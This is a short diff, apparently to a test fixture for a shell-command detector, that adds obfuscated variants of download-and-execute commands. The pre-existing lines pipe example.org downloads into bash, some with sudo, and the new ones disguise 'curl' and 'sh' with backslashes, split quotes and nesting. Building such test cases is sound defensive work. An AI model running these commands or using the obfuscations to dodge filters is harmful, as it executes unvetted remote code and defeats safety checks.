@@ -3,3 +3,9 @@ wget -qO- https://example.org/i | sudo bash
 curl -fsSL https://example.org/i | /bin/bash
 curl -fsSL https://example.org/i | sudo -E bash -s
 wget -qO- https://example.org/i | env bash
+c\url https://example.org/a | sh
+cu""rl https://example.org/a | sh
+cu''rl https://example.org/a | sh
+curl https://example.org/a | s\h
+sh -c 'c\url https://example.org/a | s\h'
+echo "$(cu''rl https://example.org/a | s\h)"
